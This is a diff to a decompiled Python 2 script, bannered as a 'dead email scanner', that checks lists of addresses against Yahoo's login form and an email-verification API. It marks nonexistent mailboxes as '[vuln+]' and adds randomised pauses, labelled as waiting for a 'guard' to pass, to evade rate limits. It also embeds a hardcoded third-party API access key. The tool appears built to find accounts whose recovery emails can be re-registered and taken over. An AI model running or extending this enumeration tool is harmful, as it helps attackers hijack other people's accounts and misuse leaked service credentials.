@@ -3,8 +3,7 @@
 # Decompiled from: Python 2.7.16 (default, Apr 24 2019, 10:05:31) 
 # [GCC 4.2.1 Compatible Android (5058415 based on r339409) Clang 8.0.2 (https://a
 #import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib
-import os, sys, time, datetime, random, re, json 
-#, urllib
+import os, sys, time, datetime, random, re, json, urllib2
 try:
     import mechanize
 except ImportError:
@@ -15,8 +14,6 @@ else:
     except ImportError:
         os.system('pip2 install requests')
 
-bgm = '\x1b[41m'
-p = '\x1b[0m'
 from requests.exceptions import ConnectionError
 from mechanize import Browser
 reload(sys)
@@ -25,25 +22,22 @@ br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
-if sys.platform in ["linux","linux2"]:
-	W = "\033[0m"
-	G = '\033[32;1m'
-	R = '\033[31;1m'
-else:
-	W = ''
-	G = ''
-	R = ''
+W = "\033[0m"
+G = '\033[32;1m'
+R = '\033[31;1m'
+bgm = '\x1b[41m'
+p = '\x1b[0m'
     
 def masuk():
     global toket
     #os.system('reset')
 
     print R+'.                  /)-._   .'.center(44)
-    print ".                 Y. ' _]  .".center(44)
+    print ".          Leo    Y. ' _]  .".center(44)
     print '.          ,.._   |`--"=   .'.center(44)
     print '.         /    "-/   \     .'.center(44)
-    print './)  mY  |   |_     `\|___ .'.center(44)
-    print '.\:::::::\___/_\__\_______\.'.center(44)
+    print './)      |   |_     `\|___ .'.center(44)
+    print '.\:::::::\___/_\__\_____,,\.'.center(44)
     print W + ' '
     print ('Mpu YONO').center(44)
     print (W + '     [' + G +'ALAT SCANNER EMAIL GOSONG DOREMON'+ W + ']'+ G)
@@ -96,6 +90,7 @@ def masuk():
       if target == '': 
         target = 'z@@2'
       else:
+        print "oh iya lupa,td smpai "+target+".. Ok,Lanjut.."
         lockz=1
 	
       #open for read only
@@ -109,26 +104,38 @@ def masuk():
           if timz == rdm1 : 
             timz = 0
             rdm1=random.randrange(10, 15)
-            time.sleep(random.randrange(65, 130))
+            rdmz1=random.randrange(65, 130)
+            print '[+]satpam lewat.. '+str(rdmz1)
+            time.sleep(rdmz1)
           timz=timz+1
 
           try:
             mail = line.split(',')[0].strip()
             yahoo = re.compile('@.*')
-            br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
+            try:
+              br.open('https://login.yahoo.com/config/login?.src=fpctx&.intl=id&.lang=id-ID&.done=https://id.yahoo.com')
+            except urllib2.URLError as e:
+              print "URLError................."
+              continue
+
             br._factory.is_html = True
             br.select_form(nr=0)
             br['username'] = mail
-            klik = br.submit().read()
-            jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
+            try:
+              klik = br.submit().read()
+              jok = re.compile('"messages.ERROR_INVALID_USERNAME">.*')
+            except urllib2.URLError as e:
+              print "URLError................."
+              continue
+
             try:
                 pek = jok.search(klik).group()
             except:
                 continue
             if '"messages.ERROR_INVALID_USERNAME">' in pek:
-                save.write('[vuln+]' +line.strip() + '\n')
-                print bgm + '[vuln+]' + p + line
-                berhasil.append(line.strip())
+                save.write('[vuln+],' +line.strip() + '\n')
+                print G+bgm + '[vuln+]' + p + line
+                berhasil.append('[vuln+],' +line.strip())
             else:
                 print line.split(',')[0].strip()
           except KeyError:
@@ -138,30 +145,41 @@ def masuk():
           if timzz == rdm2 : 
             timzz = 0
             rdm2=random.randrange(10, 15)
-            time.sleep(random.randrange(65, 130))
+            rdmz2=random.randrange(65, 130)
+            print '[+]satpam lewat.. '+str(rdmz2)
+            time.sleep(rdmz2)
           timzz=timzz+1
 
           print line.split(',')[0].strip()
           try:
             mail = line.split(',')[0].strip()
 
-            url = ("http://apilayer.net/api/check?access_key=7a58ece2d10e54d09e93b71379677dbb&email=" + mail + "&smtp=1&format=1")
-            cek = json.loads(requests.get(url).text)
+            try:
+              url = ("http://apilayer.net/api/check?access_key=7a58ece2d10e54d09e93b71379677dbb&email=" + mail + "&smtp=1&format=1")
+              cek = json.loads(requests.get(url).text)
+            except urllib2.URLError as e:
+              print "URLError................."
+              continue
 
             if cek['smtp_check'] == 0:
-              save.write('[vuln+]' +line.strip() + '\n')
-              print bgm + '[vuln+]' + p + line
-              berhasil.append(line.strip())
+              save.write('[vuln+],' +line.strip() + '\n')
+              print G+bgm + '[vuln+]' + p + line
+              berhasil.append('[vuln+],' +line.strip())
             else:
               print line.split(',')[0].strip()
           except KeyError:
             pass
 
 
-      print bgm + '------------------------------------'
+      print ' '
+      print G+bgm + '------------------------------------'
+      print p+G+'Summary:'
+      print "\n".join(berhasil)
+      print ' '
       print '\[+]Done.'
       print '\[+]Total: ' + str(len(berhasil))
-      print '\[+]File saved: Vuln'+kun[plh - 1]
+      print '\[+]File saved: /output/Vuln'+kun[plh - 1][4:]
+      print G+bgm + '------------------------------------'+p      
       save.close()
 
 if __name__ == '__main__':
